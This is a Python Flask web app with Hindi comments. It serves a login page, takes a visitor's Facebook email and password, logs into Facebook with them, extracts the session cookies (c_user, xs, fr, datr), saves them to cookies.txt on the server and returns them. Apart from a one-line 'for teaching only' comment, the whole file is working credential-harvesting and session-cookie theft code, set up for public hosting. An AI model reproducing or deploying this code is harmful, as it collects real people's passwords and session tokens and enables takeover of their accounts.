from flask import Flask, render_template, request, jsonify
import os
import requests
import re

app = Flask(__name__)

# HEAD और GET दोनों रिक्वेस्ट को हैंडल करें
@app.route('/', methods=['GET', 'HEAD'])
def home():
    if request.method == 'HEAD':
        return '', 200  # HEAD के लिए खाली जवाब
    return render_template('login.html')

# Cookies Extract करने का API
@app.route('/extract_cookies', methods=['POST'])
def extract_cookies():
    try:
        email = request.form.get('email')
        password = request.form.get('password')
        
        # सुरक्षा चेतावनी (केवल शिक्षण के लिए)
        if not email or not password:
            return jsonify({
                'success': False,
                'message': 'ईमेल और पासवर्ड जरूरी है'
            })

        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Facebook लॉगिन पेज लोड करें
        login_page = session.get('https://www.facebook.com/login', headers=headers)
        
        # जरूरी टोकन्स निकालें
        fb_dtsg = re.search(r'name="fb_dtsg" value="([^"]+)"', login_page.text)
        jazoest = re.search(r'name="jazoest" value="([^"]+)"', login_page.text)
        
        if not fb_dtsg or not jazoest:
            return jsonify({
                'success': False,
                'message': 'Facebook टोकन निकालने में असफल'
            })

        # लॉगिन डेटा तैयार करें
        login_data = {
            'email': email,
            'pass': password,
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest.group(1),
            'login': 'Log In'
        }
        
        # लॉगिन सबमिट करें
        response = session.post(
            'https://www.facebook.com/login',
            data=login_data,
            headers=headers,
            allow_redirects=True
        )
        
        # लॉगिन सफलता जांचें
        if 'c_user' in session.cookies:
            cookies = {
                'c_user': session.cookies.get('c_user'),
                'xs': session.cookies.get('xs'),
                'fr': session.cookies.get('fr', ''),
                'datr': session.cookies.get('datr', '')
            }
            
            # cookies.txt में सेव करें
            with open('cookies.txt', 'w') as f:
                f.write(f"c_user={cookies['c_user']}; xs={cookies['xs']}; fr={cookies['fr']}; datr={cookies['datr']}")
            
            return jsonify({
                'success': True,
                'cookies': cookies,
                'message': 'कुकीज सफलतापूर्वक निकाली गईं!'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'लॉगिन असफल। क्रेडेंशियल्स चेक करें या मैन्युअल विधि आजमाएं।'
            })
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'त्रुटि: {str(e)}'
        })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 4000))  # Render का पोर्ट या डिफ़ॉल्ट 4000
    app.run(host='0.0.0.0', port=port)
